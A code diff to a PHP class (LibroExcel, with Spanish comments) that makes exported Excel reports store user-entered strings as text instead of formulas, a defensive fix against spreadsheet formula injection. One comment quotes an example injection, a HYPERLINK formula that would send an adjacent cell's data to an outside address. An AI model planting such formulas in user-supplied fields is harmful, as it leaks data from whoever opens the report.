@@ -6,6 +6,7 @@ use DomainException;
 use Illuminate\Http\Response;
 use Illuminate\Support\Str;
 use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
+use PhpOffice\PhpSpreadsheet\Cell\StringValueBinder;
 use PhpOffice\PhpSpreadsheet\Spreadsheet;
 use PhpOffice\PhpSpreadsheet\Writer\Xlsx;
 use Throwable;
@@ -25,6 +26,9 @@ use Throwable;
  * La excepción son los formatos que nos entregan desde fuera con un acomodo
  * fijo, como el registro para la plataforma del examen: ésos arman su propia
  * hoja y aquí sólo se entregan, con entregar().
+ *
+ * Todo lo que llega como cadena se escribe como texto y nunca como fórmula:
+ * los reportes llevan datos que captura la persona (ver escribir()).
  */
 class LibroExcel
 {
@@ -106,6 +110,19 @@ class LibroExcel
         array $anchos,
         array $ajustar
     ): void {
+        /* El binder por defecto guarda como fórmula toda cadena que empieza
+           con «=»: una razón social como =HYPERLINK("https://…?d="&B2,"Ver")
+           se ejecutaría en el Excel de quien abre el reporte y le mandaría a
+           un tercero el dato de la celda vecina. Con este binder toda cadena
+           es texto; los números (los montos llegan como float) siguen siendo
+           números para poder sumarlos, y null sigue siendo celda vacía. Se
+           fija en este libro, no en el binder global de Cell. */
+        $libro->setValueBinder(
+            (new StringValueBinder())
+                ->setNumericConversion(false)
+                ->setNullConversion(false)
+        );
+
         $hoja = $libro->getActiveSheet();
         $hoja->setTitle('Reporte');
 
